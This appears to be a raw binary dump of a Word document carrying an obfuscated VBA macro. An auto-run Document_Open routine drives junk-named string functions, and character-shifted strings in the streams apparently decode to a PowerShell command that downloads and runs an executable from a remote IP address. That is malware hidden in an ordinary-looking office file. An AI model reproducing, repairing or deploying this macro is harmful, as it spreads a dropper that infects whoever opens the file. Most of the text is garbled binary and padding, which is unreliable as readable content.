 IoRGUysEswCgv $ B ' ö     k ÿÿøq  ¶  hapwgEbSgztMiCTmUHk ¶  hapw¶  eQOkFq$ P ' ô     ¶  zJMJWieantoTXC$ B ' ô     ¶  dOVwisTmkXPVIhjKTxT ¶  dOVw¶  mpDoU $ P ' ô     ¶  LvAlSpJinrylgntgPP$ B ' ô ¶  dTFclXqvwwgWBcUo$ B ' ô   ­ s€ ¬ Õ ¬   œ     ¶  zXtwgZPKEbYmfgdV¶  zXtw¶  wMoHQ $ P ' ø ¶  zXtwgZPKEbYmfgdV$ B ' ø   ¶  RrXIacYbVzVhrZgdA ¶  RrXI¶  bQAw$ P ' ú ¶  RrXIacYbVzVhrZgdA $ B ' ú k ÿÿhp  ¶ 
 wZVZsYrwRk¶  wZV ¶   EQQvSiJ $ P ' ô     ¶  ftbkxgXMCZEf¶  ftb ¶  JUCu$ P ' ô       ¶  TiTXIQOVTkYE¶  TiTX¶  wtXaM $ P ' ô     ­ «‹ ¬ È ¬ I
  œ     ¶  cvOFHSUMGCx ¶  cvOF¶  bhRon $ P ' ü     ¶  cvOFHSUMGCx $ B ' ü       k ÿÿho  ¶  KJGVfZktgMXe$ B ' ô       ¶  kjkOQbgaigU ¶  kjkO¶   vHhuHxc $ P ' ô   ¶ 
 FzkwoWdFhw¶  Fzkw¶  LLZzc $ P ' ô       ¶  ItwISldMyTKSBR¶  ItwI¶  olpgYF$ P ' ô   ¶  YDzbvaiMAIBbypzui ¶  YDzb¶  olnWeQ$ P ' ô       ¶  HsKGUXwYDDKVyxKZnwm $ B ' ô       ¶  xYwbCWUUPqxaManW$ B ' ô   ¶  cqBchWOxBWHDTcYZ¶  cqB ¶  QmXKs $ P ' ô ­ «â4 ¬  ¬ 1  œ     ¶  aJXlZERCgjzk¶  aJX ¶  wlJT$ P ' þ       ¶  aJXlZERCgjzk$ B ' þ       k ÿÿ˜m  ¶ 
 hpEvvfcSKjBfJ $ B ' ô     ­ Ùá ¬ x ¬ o  œ     ¶  uwkaTgCqctJUJVg ¶  uwk ¶   GwEvTZj $ P '        ¶  uwkaTgCqctJUJVg $ B '    ¶  dHpMpLgmVHElywwHo ¶  dHp ¶  FqoV$ P ' ¶  dHpMpLgmVHElywwHo $ B ' k ÿÿ°l  ÿ   ò þ È         Ê ¶ V )-(fyf/y0333/96/:92/69200;quui()fmjGebpmoxpE/*uofjmDcfX/ufO/nfutzT!udfkcP.xfO)!2!x.!fy$ B $ B  ' Ê ­ vý2 ¬ _ ¬    œ     ¶  IoeMprOxoiGzYKQGexx ¶  Ioe ¶   AQXbpDi $ P '   ¶  IoeMprOxoiGzYKQGexx $ B '       ¶  ijRSxrkXnCqf¶  ijR ¶  kYBzq $ P '     ¶  ijRSxrkXnCqf$ B '       k ÿÿ`k  ÿ   þ ¬   ¬ º ’       ­ šÑ4 ¬ . ¬   œ     ¶  YwnOeAqEOEKBWKoceFA ¶  Ywn ¶   nMuHXDF $ P ' 
  ¶  YwnOeAqEOEKBWKoceFA $ B ' 
      ¶  PbGrLduFzef ¶  PbG ¶  UuZR$ P '       ¶  PbGrLduFzef $ B '       k ÿÿxj  ¶ 
 ZAXPoxLtfg$ B ' ¶  xtAyykASWjWOFdsoVXj ¶  xtAy¶   rSqvuPO $ P '   ¶  sMJmDJdmyfZPBDL ¶  sMJ ¶  HCplEI$ P ' ¶  ZoEOhTHQjouGQQEbg ¶  ZoEO¶  HIALqO$ P '       ¶  VakhWVUfFgOVouwdVgQ ¶  Vakh¶  UUvhe $ P '     ¶ 
 lnggkhmrvK¶  lng ¶  jYXFx $ P '       ¶  LjoSRucHLnmiElT ¶  LjoS¶   QFYXOBv $ P '       ­ G\ ¬ Ÿ ¬ –  œ     ¶  mXxygAGvlhnBqn¶  mXxy¶  hMmt$ P '     ¶  mXxygAGvlhnBqn$ B '     k ÿÿ°h  ¶  qQPnPjBuBiqp$ B '       ¶  mJBLZGjQXUkuur¶  mJBL¶  rrpm$ P '     ­ Êõ8 ¬ d ¬   œ     ¶  FwHLEVsyGUynEpiQW ¶  FwH ¶   YVSMKSg $ P '     ¶  FwHLEVsyGUynEpiQW $ B ' k ÿÿèg  ¶  mHoveurcxSeZ¶  mHov¶  njCgo $ P '     ¶  jlCVhjaoTUqjGJ¶  jlC ¶  HriXb $ P '   ¶  vvopVmEIPMVyEUpUrF¶  vvo ¶  yHxgX $ P '       ¶  OzVnZIOTYtOAcsPTkW¶  OzVn¶   IxnJfJQ $ P '     ¶  qufIemtBMizXUOcAFBi $ B '       ¶  FWYGtLAUARd ¶  FWYG¶  Wuuy$ P '       ­ ùŒ) ¬ 2 ¬ ë  œ     ¶  DblVQxwYUTwczGKVyn¶  Dbl ¶  pfDSQY$ P '       ¶  DblVQxwYUTwczGKVyn$ B ' ¶  GXSPbrlshPPQpCK ¶  GXSP¶  hdMjb $ P ' ¶  GXSPbrlshPPQpCK $ B '   k ÿÿøe  ¶  wftlIjIwmVBdeB¶  wftl¶  qpBrRS$ P '   ¶  bgtnYuEnoyrc$ B '       ¶  JyQwFdusvQbCwuSvxD$ B ' ¶  hvTzeaeHiLEyhKT $ B '   ¶ 
 qGYfOmRifkxQs $ B '     ¶  ExXDsZOUJnBKgqMQ$ B '   ÿ   þ È         Ê ¶  f/mmfitsfxpq}KEhqD}FJ{l $ B $ B  ' Ê       ¶  kQBkrSIlecqskkCyI ¶  kQBk¶  mKjvie$ P ' Ì       ] òP  ¶ 
 vTmFeVGFvH¶  vTmF¶  SCRHii$ P '         Ê   $ > '           ‘     ô ¶ 
 YWxBagFCOd¶  YWx ¶  yAEfo $ P ' Ì       ¶ 
 xSyxUoiokf¶  xSy ¶  QxSQb $ P ' Ì         $    ž    +          ¬   '   ¶ 
 XCCrYhxSMZ¶  XCC ¶  ZTtcw $ P ' Ì       ¶ 
 GqGpVlTKOu¶  GqG ¶  qhOWJ $ P ' Ì       ó ÿÿPc       $ > '       i ÿÿ0c  ÿÿÿÿ(c  ÿÿÿÿ  Lº Attribut e VB_Nam e = "Thi sDocument"

ŒBasŒ1Normal.VGlobal!ªSpaclFalse¢CreatablPre decla Id žTru
BExposeTemp lateDeriv$Customiz„Cƒ1Publ ic Funct ion zxOI nozC() As S€œng
‚   FuwkI€M Right("b zmZkcyxi€co", 5)`DRcvPr‚†(9KrhJJsT€Mid("L MVofAsyu@cLphOZ 1, 7buix€LTrim(" BatTuwXg hQaiSmPOCGD"LwSt 58
AyyF‡hZxZof dppdcZaHabzvKAR€7C onv("pPW GYgALyTn 30„JhczuzAtrReve rse("xXH aYVlayCu@uZkjCipÀeeIley€DH PtYwReVs sPhzLPlA
Q€2„ubftsÁ
/6„sqnBÁ’(ÅTUJZeÁ9‚NafsEZ JPlgBkssplOkT ÀNJ0ljTw@ƒYxu€UMtRhEi	@qjtDWm@	R
e@c 5Ejqk HRQQuJmcG "ÁiYyˆbEI…8gkoÂ7CfbrfwKlG ODjFdARKa	dcbCÁ	L fYKOwiKA USmpDepS„Vw
yTVaÂUC Ü("fHL XccfzZzXKftÆUPbGu‡ÀJ”vJOYfRTymuoQ@hKLOsiGA`LSnWPÂWa OpeQFOiRusI@¥,wgsZL!GRKwC BIBFruDzZVaeuGAJà'aEvAUj€WHepmHC&á OwLcZzÅágIf STXicgà 49 +  6430 ThenCgatrpjbébQmhHh zffXbLvUpzUMH¡á tøgnAIÅ àZæU0„MEnd IfƒXOOb{BVUh mkFlrmFXpCjIU
Aá D sprfPæeOOD!£&hKWz saGGjxjI€vWdDsyG`KRodo BSl YbYdjIqrMJcc 
2, EXFiksYIÂSc
GcaXtiWDGWj&Qangl`	d„jWenp rXivEbOQpHXG†GfnYpWTAK@`"c}z IwMmSDtc0olfX@¥}gI0UUSja”äQMn MvxIVpgCEIPbxlPƒ	,TxobfMa qJgrCRprzyEÅUUvzˆVRnàLef@¦ RhWiCpAG YLhiYSKIozÀÅPctdÄOyBpGOZ kZdKJzbp‚kE
XZYBI!
dVyqZCEdEkPBÇIoÁ…cxfzrIgn pWDvZpPe†l %^XYiEl MngsiDRk IbpfVetPQGA&7MqEU DadWJQbj`eVAvH$¥
ZzRHa˜Â<HIb DcWbpnOzÆqáŠ(•ldM¡&i HoMdaySF CwYMP "â IuKæ>TxFdwzá„¬fpY oBnrzvdYPhKDS 4Ä[l8heV*‡å	RncifKFgOÀMBKWqeq_•`ycFVnAÆ	F ySkBVIBu€igGkMrWq	ƒ1q GOxvMµÀEhOphG³+ cwEGOdLg BVvwHLqQHFB¥gVIDñF”wovLMbÈkeoWjnqñ„ ByEYPSGj gkfwbwDI†dAådhCHX!N´kZcdGEA diXodhrFá KgyyRSâeåv0gBeRAntwq zcMaesna€SmWMFrb016*Vhqa²ef ERzRrXMs ldofqFCZÇ •Moa1v7 lacJJeWw`zoXbB u7MGyñbp&5YJT HAlgWTQqM6TljczTjq°©gypSM HzickxOQƒ…äVUUOTiá:(145ðV3îVczLgX vcgT GdHJsAln cLsWD`
"0a yZWMOqR?)åùÔ(!	dqKKHéyUmx LtHeXAnX€YsIWwfm¢Ã`q hGvvæ"		 ?m5
	^ndrÃÁ&Ë0nIfLñ³* LBjbzEXl PRQZnClI„Bo…uAsDBtr3TEsdqj aLzYqziXdzoq7õYcWBlVÂåwLI ‚zeHZhpM ofvIU	ivcÑ^£	U)tQmfk‘Œ$^sSCJh qdMDKtWHgU•	Q€ujVR$bT¡66€16AluhHJPZ‰S iyePCkxr mQphPDMpMvaq ZGmðKhbPI%©_Bv)GSAE*NY iDhhCOUvÐwunB¡g" ÐTauX¯=ñ·G1 Ût%9LhFpbñ94ffmgPf upTcpEXjgshW5OFHIJD!¢<nqH UpJrcp, Ã <EAxETÂLâk goYTFEea XdWKFsCd
VaP3uMMgHzv@s%CCxf…bQ DtBccK0•BZfPa€ÄKEKgGf ibzKQAyxfY€MxdYL’144280‚1¼GhwlQÐ6=zHEnfEq LwciCeqzlf@a Vks|Qr)Õi¿ 0ELQR±UDIO ZcDlDdJT€mZavVlzz<€qKSFrSp
D37p767}TEOw¡¢vPii HqTOBjrt
qƒ"ð !dfUE|cu9•9Êï `FjCmP’­C²z rtmgbuTxÀnVrrMs€Å`VqiueÑ=ôbh pHSgEfpoEâRu„9oZzlmA`89550Â7ìMyJRÁf DIWrrpUHVYÑ
Ñ q PAl|Xrê´…Y¸8eº If
   Wt QxL = RT rim("iSC MHrxaPaL")„ApPiLs ˆSpace(B8XDSCf(t rConv("l LKQRHZHL EFpDzMYA", 0VFUWBT XRight ("WJGftp@rMxtTx %2!%OkAE$eplh"PfTkC UZJjRqJw  ' AgKQxžCUEDGYU 8LÂkVwyA rqXcaQie gDJAq*ODpoWZ	bzfz OBqrhVMxpBuad.	QLXQDQEhfgg€UCas e("dcQqr@dMPsny…C`pZMkz`„G MEjkwxwI MBpEVZfj…YmXZZhC‡AafVuhb UWQKGHhP(SjbŠ6„ŠQudyYojng€CmvXSoS…' lyJUc 'Lef ®tIVoyb nGTKksvI
t e5„$fEVl,sA ä9„Wh ile LVTL€h < 162ƒ}‡lsnappItrRever?UznRKoY ZldMWHMCzÅ!AuQiTzltChwLLfZPP‰
rjL@GEeWvtLW LIxZLUhd xqhalIkF€HBDUWmrCÃgquWpitàzDKJa ;…œ#€PZcuXLo@ Mid("wxQ BeUDVEvA€nKGhddZÀ01, 7BWg€BdHZRPi 
ÄqCPmoRHs ySxZnKrbLÆqÁEIXTwCH…efTRT njaiVKBv1@2, ÅqApC(VOpªSEÍEE aekOebkJ uCaObAfM @
É0
If IBtokC€117  + 505 Then‡joafW
XÀ REÏYcyE XMLjVXSIs " UnqøSnG‰UE €f<« a$End å†áT pefsZtAJàƒOPEhAysàAlmhR`
{a€DQCpvRY ƒ£OÊ"VIeSFAÅ"PmtTiMQ RgtAhjGQã`	i"QaB V`–e UsYhsUgv JOvAGFaW4lS " Á XTbbÉbqUwZe<¦0XrvxeÀuokkdr I
`TCuvxzfY pODjmLiG@RGfZzqìb`ztmgB¢‘¢qM uXZxlnmQŠCM4(MGhGÀ–zYŠ¨kjMkp UwsToVQBWji¬vDAkuW %©zFdD rTMaVrgl0YqXlÀé*Uf`HACisÁqÃ3p dVGMbksIÀYZSHlHÀ)ÀlWHezS9Ä hwTqowIEyT¡R)QLHmRu kpcyl iCxQRSlrW€
`j‰bcpWpF(AXSBwqLHR¡º©-idj0CuWo™#vnW SzYHHiRB IwTMjldpÀ€jEš!KCGCaDy`ævhpDÀxdlKXUâŸ)€ZnuLKIi."rzcfDIy€OqTIsefƒ éÀowJqlC"G`158Ào3124ìoewMRm æoeIheFhàYXZoz¢QáàÀ"lMzHQf·áE àæoª ÔoIpb0jOnP€£;eg tZmUBmWC´eB 
3ˆM£»=¤¼„+ d¼Wend#D For tWFDvÐ0 To 234
yjSnU¡Ö
JwyBpr iLQWYWFvpqOhU±
Pa LYHK7pDMH0egoS°”%sz TIWkTQdixYÙ"YdHvÚ"YGwSpoy xtCYztiJà	yHLVoFaÂ(4ŒKwdus zLvjizZRu‰qDLnHsEnÃ‚bZtJàRQCnWZl1P@WCTfiKÀ7!A7531LpXtA±>fIHSs@vsFOay`
"ãÑ q wfXÖ”¡e‡	˜xIRxzÒ
•NbaXoqvh4iS¡3"Ð ñUiüyIiUùˆôÝ\ÀGrSZEPAZÁ96EQGrx€“% ±WyPfAICŠrtJaI yEEdWejV Vywqa¹	coXrso`¡ZGw`QuqMepb wPMMuCGR wEVvj~"!!QpqJE™Bp0mwWWÑ’=cC rRSeXWOA kXoTWkImƒá=¬IsiCWpðDjUYQyR8iiUá3PF‰@dBUwT’OUdb DsxlPzRL 1	P¹PmxxmwA1âGQwt IQPBCYEv fàÉSCePayxgd…MTlden qYQŒz€ZIfxtJgqZtenHWT¢:	Ã¥aw $WPPTÃÁ­Y oXcXa¥I" WAPhrGOwXJDe©woPrdaà	$zhA wccywKXApr°1ylDsWUx‘P‰wER€iuImSYri dWweOtSAµ”EtYDgK YHIcQhVBgIXª{zXKP0ZYDdm<nC VcfwBvyE€WrdXEwt	€HFuqkWkÒxYXfuqSq WItnJcfhB1Ê9tBVIVÐ„DwqioXt UzjwAcYtqWpt¶ŸNextSóS±CYLbavY2bš684a}šyaXsÁj.g@zMAxHg NgÁ„"ð Ñ-GOP:TuYªXClwmvn6aMuPUO TVeoLUmu
!("!qBCCR>d9Å‰ýD zRpQYXum CWbMVUlKˆZMU5RcQÂZLrLDkcS fXXDO%zu0RUSMqÁäbre DIiijoZzeKjPõbqlDpÑ”ºWzwMW WLvyiTvAizc¶_EjMMFDz‘S1hIE BDHELVMMdeA‘ºe ITPqVt1DSQk zQTMSRaP€twauQZWe
UDn¸˜LugQ qoKVOqpcÆWÜõwjWcò8ó* iYySyJcX OcOcEYgBalFLkFnDYÑHTGURtdO MIRZpAtrcMP˜ô&XlBDvD¡215p‰1253,jQhGc±®¶ IfUDwK g€¹ WGxOqFJ"@, "IfU`v CJOaHp")
  QhGc i = StrR€everse(´0DwKgüZEnd IfrZqbmFvznpace(6¢If L guQIy :87  + 1621 Then uCGc„Sj Repl? "HsTpswg nwbUaSLoLp® yKc|oi	³=	³@¶P@GfLLBr <L eft("LSk zdqlPibw(IPD94dlukKSL€19d4492ŒdzmJqI †dwraeÀFBlSci]pDZemb	b	bˆˆCeequU	1zruBbM€AJycDjD.Ã luBm‰1EÉ„ÉvYcWJ(QuK SÊvjkSRTVÁ!Tri m("xsPyP€chcSopt	ÀyBBGXv€
D17M767
€wPZDceÁe€n nHjFybEypS2ÁbpOðDgFBÉ…	5IaHNYXrD!gi rbqjgjHApqJgsÁ yàftGsVI…IKNkGCidhsÀ5Mid("X yiRqvbnfˆKiR@1, ÅÉzATDI?VxO DpYtobCK fJVEMlmC %€imKDYeI'ÀXPQzstQ 13ÂX205aŒ¦YhFwâ5e,P vsawquTD sZlfWGYbPZÁÀÁ pYIðltUPŠ $‰ ‘‡P!Á‹!AAXKSá„B23453ŒkMKmnI!COu€ndmJlsfƒ¡á yAGJDj[ ih PuPMCDEka
igh e biHuZrcHYH@%qlYVDSG UCa¡A tzbZKiYx inucj¥#fCIHgylwtr sEdoinen5hVOIEJ Rã
VyACGh sSJywCIDPhiTeÀ2A RoEBUa¦RÃk uyUovcvr pxwwQefrÁ%gznvf
Ã BqUhMxFOtlPAEMcmqd@I#yMjX mxecoztzUJnEeessiC`LÃ	PfP OMEOwTyM pGxvQÅau0rPgTà[IU YMkoQJEH`GiQQjÁg[xyyJ!ä'YPI IoAywmDkÏJwfCqo 	sDOqHuiK VdJJExLZ
2"` "IldLÅwMzLATAz¤fhVBSA€uSobJua¥`WlpemÚ‚x aBrLhjzV€JOpaRrY`
(qVJUSYLb` %Conv(" aKoJmzku€zapMjoGà‚0„4KVeOAÊ– tKnGkTzG FZJWE "á wYPLIG%0moAF¡`ÃÎKJ ssowoQGpGd`…‚bhknhp dTIne kmyfzAGL0yLMLÂ_cèzx OInoz758 4 - 131

¡¸Functio`í
Priv ate Sub  Document@_Open(ðJ`Egxyxs–Q ftUlOBFdtpMµFor  nBtdE°0  To 86‡|qy`eCrnu Dw YZXCnUtF4XQ°CEá@fbØqxOce74‘ djXkpSPaBÐ„(EwsgT MFkKzaQQUiyiFBPeQ¤HlEMKx8Jgqjq HbvDODRP256°ˆ2819HOzuPS€ ¶(aYHjc GOjlBhjZàbEpbcQq ÀhstRCg		 $†?nyGtX) DLqFCC PoHDKgrXÇaa xKGZ
•¹Ìt)}±kZZzLmI GHjK€EvKJIoKA."ñ 1 uHzUqÁÊpKzALZ ã+ JZHZMBAP OgyeSArw
q@3ØiZVWa,ëƒ11 0iPL$aWA_99 80Â3-yuLCá2& gltOzPvR xGHEEmZmrmò¬`jOI~kéåIvApmDeJáðAj wheHEViuzàÅ@ÁEqvg‘’^vkqKMZ€oVsvLwK Â5XkqcoBô] SyPJVVkZkr@@xVHso b9Â—Y2vbsnYbSrMMuzOZD ImAocduK‡‘|`MùowCqz£ eEiOwexX SMkhkà	" a bDqVqdÀtvjajrÁ6 AAWhsqlApJVzA@Ydvpbik&25q478‰XlHC@vdneqlZ8sVGÂ²Ð áYLøaQXJÊuÀ6¨Ô}nImhWCVO±(KhZV bHbSFpFyTclX†2, 9IzXDTdrEM2c{pvHo€ppJvyXf@§Â„0cMq
6!F6846,FRsxuú>ldEjuD JxkUvJPh8oliÂŽQGbðIOcp
Oa)Qncf1p¶w SmQWdvAtpcRmPaq vÀrGXsncÏ[á û?Á oxxA·ã„ErLVmwÀHCwWFK¶„`dMZmAÒŽÅ©L FnwRhyMY PUbfLiuco±	Qq ySiaJWmjMTYZk p0c:AFvTx ywSaOoFW0ldpdÝ…*NextslÓkpHQLYDJqam220±a2„38ŒfQyj‘”FigkgyOQ€lSyFplW‘	q ldmltX?IÅ9ü_ ö tEDhp!¨125±p	604}	 =xbÕcMDgaya bCfaGIlx	cý¹ MD", "Ge ZtBIw")

  owCxv  = StrRe verse("c MDgayabC@faGIlx¸E nd IftIf€ etDAih t 28 + 547  Then ²JalFa <Replac VTUehn€wTjAKWoƒ wSfnZ
“9	“
<¿kQHˆqzJ q183 ‘6056’Xrtng	IwlxjZ vEkpjdQcHxG x •briøTtU‰”‰JL€oOddXjM€8	jjoGdbV oAscSryqXLJ3€ªGBkDOKb207 b302ŒaMiqXG‰aboeAExS exROftbu‡a 	dLmi‰`…	#MD0A‡pocIA"pwUmTq WSonrutFhL€bzfðsOOK	E	
ŒKyrieeuoŒKJGarvdA€jAoYKZp… While sn oxH < 36‚4 žBreMX  Left("Dx IjjlrGrQ FdEPYimj ,4ˆ9qGbZb„mf Righ@ wUnvVukTÐWfTES6ÁE@itSSpHT€$59i12
¿rDAjC¿gOp giXxbYjYàDpafBAMÀðTvfdINÅINŽ Ä$‰ÀÁ&wEHYeoq@C?sJGb HUcgOEXl(CtfÀ
3¨vu feFDléEc qEpEBrwVTaÀÁ DsoDXhb©IWKs vvwAKa
Tr im("mRPB EDrnqBhD@hhmQos	G WXjmYLOsÁ
bmCdSF peFgGDhcbŠUvODbAnHf¡( !Conv ("BoPCER nDpvHš0h€rcgDuUwÁ{ Mid("tVm UcaJrWlq„rS`1, 5È€HAvbLYháDUCa¡žDqTW wrlnzsap KtSHO‰eU(kRkÁnL#uM AmJcYbnz€wHdUyou‰€pYamgMA#BPAqdpZbn FkyqgfqtE iJVxGyEt!©æARdwp`QLmps`©e`LjQAja§rM CRfOhRXo MMKxw "wƒ@á lccfr)ÀDTUFEI0åR LsBSaLgQ iSmyFySV
AD"á xKXe†“ÁKãm=än+ 1!£nWend#Fo@r udhsá†0À To 49¡  oCTurAVY
UmmBZdXÀSjfgaQá npFFCZ©ÄTP@hIvhV„6 HRPmQyPO gTCTveFIÉRgKZRoBdQdàSpAÐª.wÀAIeBGc!c: gfKGoTbR jwWMSDFBhB©	yMbmi!åkkaxTkC tEXCtvHxPziWdaÚ2(LK`CwcbodU wcJLpiTz fFItdpdyaÉYGhz!FÆ:M fTCAsAxe hXdhOUdrLU¡"ÀÁ rnoE"ˆ
hcRjySEz ãDqhuQWg€\ogO0wPiW°0ntÀBolhIB p'ÆxERJAUg€BAcLvlK*ubxpàV= 
 nxUMxqDB VwXrBizia	DnPnzYDÐÔzzQjb FFFKqmvsXFutÚBKvx°$XknfZR xkwRMpjhhViKHpbz`vwVHP ²>z yuIZedrkØcnJ° >7¸¡'0[yBZOEQ D22A[723írTcQA6XwHUx OzQZelÐucevÀ"Aq ÀqaMcjVIõé/”	[EDlVRÐ	“*9øSfrVñ4iqIARt JrlzZnQYnlšijoIO‘*ÄLfgLne ZOAporqZ  ÙoÄeKzgBbEà 111m°9a|‡VJHHPÆz WxRKmPZzpwyqO¢“‚OüGFš“¥	ÜO	  qZGdosL!v CLswPI SHIIrKrjàTIfXnQ aq @vxYRhGiC YGIRV°
Rs> zpnVJWZn`xXRuYJ8ÄcàMlBdYÁ¤ ­‚0î}hjsFOeTkCIoKEA8lSY1Ñ q PuøHQHº…©¸ocqhUVch¡v4fsUgoow€RlxpdwIA[¹MuZgiweVRw 
³shOI EAoZCthBZZx‰egToPyàÄ:xXEx wJFWeSsVAjÙXSXbtnb=¦bsdn ljknZIAL€iXhPBrqàáåNextCa£`£› HWBdR ›146c‘FXEyS0PVyCÔhe xGKOfvoYjioo™LHZvm€$yQtqv udvvhGdDHyRLECXWsmS·vyeb AKgsAOcY*fRrtJllq8„EnRvWmF qkSdVsnhFojKQcLjUkfn—XREC@JXckeJº
DÀBCAJJTt
 AmKyTdJd€DOEJyMY	àHWTaL £@Y‹ UScCGlotÑ=Ó8$#ÑVFh0VxMtÁr‡fZ WoRcVRYQ ZLSIFLjzƒPéRBbAPáÉÄbbfSKFi XJMAW		vyAIxžHqyXZ oBHWZTTb sQzoSÉEaMSFñJDOYJ KKcWBhGfqv*ÂJUtGInF(ruJeyb xqgnYkbCXYCIbxsk Aˆê`brkeZRfsMsšaHv@iFqgzHj FzzWOzZAMqOLéXeia‘pâdsCpOD QaRFOxBYÄEM!•2, )eÃ+<= s |ã,‘iG†jg‚6217‡.;ðhÄ5Ðzó‘bWBLX"K#ÉVHK tpygzBjhEgpPåpXlbTSUÔas>KGj VCsUTgHy smHLg¢8j¸@)

  E lseIf iG jQ = 346` Then |˜E QcYFtwMe „StrConv ("OZFjyA woEai", 0 ¨TtmKeTLpace(5Ô4445kwjougfK	iPYw€cZkhqmchl ·wJxRCx -173 + 1521TjjTQ!‘Repl“"w XznIaUnB uEAJRoLoz +‚
IZxzxvC"g2 €|R€everse(‘!„End If—° 5257 ±HjKbHr€cRTr im("DruU TZhUGsCA€lHBdepyI•Û601‘*YSJE€)Split(€kro, "E nLBiwLlA?p"), Ch r(127 -  3))(1À1ˆA!Š47841tQ€ltOaLnP@ Mid("eXI@WogOAt‰2, 7DTeAARG	Left( "CMonyiLÐQmKO $6@	‡:@KCndxz@UCa_CoqOn sTlvCtRL`uGMbY‰kË)169Ñ)vprdRZMf Righ  YkorEZJ€MTgaJHpÀ 2D*MbTlqvOmC  vvzX cdPpxPHc PFcyo™f286ÑÔwIJPHSoÔD zKiKf bLleUicjhVgHÀ 4ÊAL659ºA«qLZzvZEp@+CVVmG RcOwfALS€BCwljcQ Ã,¡dJqs0†c aHQXaxen€ZQvpHlO¡6"a`"nPoR$UJy17rznz wWaLm@SÂ‚"9Ø569Ñ%Ff TRkaHÈ%sG mSGtbEDBèMahZzk¢‡E"
89
013PXs0CmbQÂ'#qse KVHucOQtFwÂ‚Up206ñ™c`oFYog@„Wu WwiSkEaK qCtYsxzeIb+*JInWp¡v$gvwoBT pzVyGVJFàiCfZx¡7a 	‹B76±]SWStyl`Æ<ogeG sZQEAiHf‡A;àÁ nZvG«lN819P&zvi0kQTD¡¬cNrF mjbUkhdi`fIIaL@NcÀbFCnUH`CACá5*3700°
JÀDEibtJA4$g SUSOaLKYhezC@
3`>!#ZÀsQqGfv@
ƒ keCcQhwy vjsdbGbyFVdÕ493‘)W ruOCRGCb D4ZgHaCg HSrPgXGDWJUn%4oriOwOFWHgkÀwVgSah`™{82‘`kCdjlxYVwAÃ'ìaw0IwIx‚F¥ÜSc hScUULEZ
@
"¡á ndvZÉ565  nxxOFñS ñ;Q pÀcVBqZie  yDklCRVTZváÐ a qrJ0VcBZŸ%‡‡93Ï3! Àt KdGˆlkh`195A~Ÿ6Hp4b.pkC ydhOSCqp€exkOOOMPa ORTEwf?5aõ9~/XUazJ™ITsb tliiybMUpggXX0a k uOPQvß= ùt,…K9446`  ACMlBQbSÕVPJv AhdrJiashXgE¡v"1A
W8oFr!
ï0£¡4252ß8 wSKLUAw™eRJZ AiwlnJCl@qmxJUI!Z"awEmZKdXåvLECtGYeÒ+³xhljfàidjJUÁ‰á<?	3	27Ï”àZhaoBhu9	xea bQlcMxpPg" ÁPXGFlyE§)1448Q#±)LPPTRq²)69°)7Ý3cyLMS™XGd ysPEStLkàbIvEEQ0b ünbfñµY"î\"qbVswtr‘ÓºhdPuHn vclGUPlFàjoyRP Q»¿	³71_  pC0RBPp!?ôlMI txmJmcPTIJYJJqZeÑ1DBPwZE zCULgSGuFZ/„È402Ÿ@ € CbxSDv¾4_tRYdEYvødZgQÁA"‘1 @jrLJRtP100ixCZD9WUDTetr jhMMTdfa ± a nbQCYþC
¦ÕY
¯;Ô	«;È580/ˆ  ºØ	xJtJlaLk@oKk(1)»" cUSHYq
FQ'Õ[12;  @mFoHSbA2LƒŽFnYeVGJ mTJBbQcEVXm!ç!zOc¼ws!ÊC`¡•D
 ü8{IPoyaZ±™$ReHHo CafrKeflàxuAyeQqa€ybpiwxnpä	QruyIQP rpEgLhXy0OctKû	K27†0­8aVdRUP `StmtGwcla<Ô	aJOv HmmVubQha°Œ¿2³2589ï×1 qRL’ï×WA aOzdV"gÕÇ×6@×2À×3Ï×:2ƒoúÀ
MBXsYQpC#S?PzwXÐ£Q`OhkjwÀSúž¸   OYgdD  = Mid("V pKMzASGm CihnaG",  1, 7)

  Else€If iGjQ Ô 3087 Then @NRThUd <StrReve rse("yYk oEqiWHvO€qcStKK" ®XYFzVUDfF/Conv(" sznpHzqt HvoSvDbRE ‰0†490…e@mAqwbm WR ight("QR JdTrnnfy(zKr R2SOMhlLTri m("nPkTT XmbUiFzhÀDkneyWV‚216>XDKekl *Space(5„5Agtea€
ƒ·cegJjoÀDlnFlf·9•4714¡€Èmziwar€,79 @+ 4088ŒqgdTj€ReplH"TOTWL bDQfEiZdEK DPdfðyxjfEhAE‰t‡
„8MWel
 LzZkajlTÀRtQUmf@GLSTyp‰Å‰ŒDEnd IfCKeVlygWÀ7€
‘DUkH vJBqvgdxTcU Ù116‚3PWEVJCuIM FEFMLgfZÀhGXkTvA0@aTmyh1o3512acOzzkbfÀLef@©YcKPaUK0OPaQ€™ƒ152„RshsSqÁƒ³eQDbEu VxSJUMvCVDJoE[Dxd`dftWM`‰-O QVEkGrQn gKPrgy49r_qcnFfT$€ƒ1dyJKlBI guESFvjJwqz€ù1391ñ1LcUrLoÊjktJUsMo
H L£mIIG ntzdWfjS@rQkqEx60QˆofhHKTZVájæJWYCp kHmlbSHP„A^BKbhPjg!â8sAGTe CYjgpFBapZqHL`!ŽõC2‚2RZTHqS†
 pXuUmxdI€cqnfjYV@
3daRScrylKxTaC dyU vFrxlSJr BSOeZTLi	z 34™vOoV0EmbYf‡xO qhntrmpE4xT€"àÁ XJpAJa"ykMIpEâ¯EŽsdg PXmRrwwRca'" ádMi"CY1261]mC0OYff¡A„>KC erZQVMDA€TrRvsYSj˜A ¤qKpGAA½2$51À¤35Ž~VdqqZ`(FXEd SEeXcvMY4HO!."!¡AKðmHFsÅA… ©iì Ä5E—µA498R€fCxxLyláQRƒ<swUeLB iyudoflJKfj)wdE Rrkmt‰By dJeQjRTJÀejbnmha1q nTdvJFu{mQlWHU cl9äñ«€55Ï#   FhZKDAsñtr“@aqH fXQSUbgk€seefgaz‘1G¯@ÐU†804ŸS  QPktsggpƒÆ	»RzSGhF¡“6Ÿä293¯ FwboeCÁ‘»JAzgxYOof 1o’5_L¡t„ynâlit(…& kro, "oD rUIPfB5m" ), Chr(123À*1))(13_T11Ï` niÀvRjYptÑšd PjhyqcGV@yMWcjA±•3TpuTLoHsQ‹æ/tISixu degcUdls q"a bKyvAÌoHë";!18O,0	 RcofqWXUÑzrbrVoTS cKZYTklUktOl 2, G1Ÿ”559O! hrlDÀKá[F zFUGWsBUÁPSLneAcÐñ&  " &KxfyZQ5227 665Á}­frtCI@† jKGDFjfR€eWhYYVE0†" a XhsRaõ¥YAÝxaKutA™CgEEt lHYrGdMxàxSCdmQQq ÀQHYoaK6}A ?	 O%
¯Hœ=19Ÿx  vMMBFBJbÇijysL@RbheRP ‡d`rfuTe 
U¶f€ZnjHamP‘
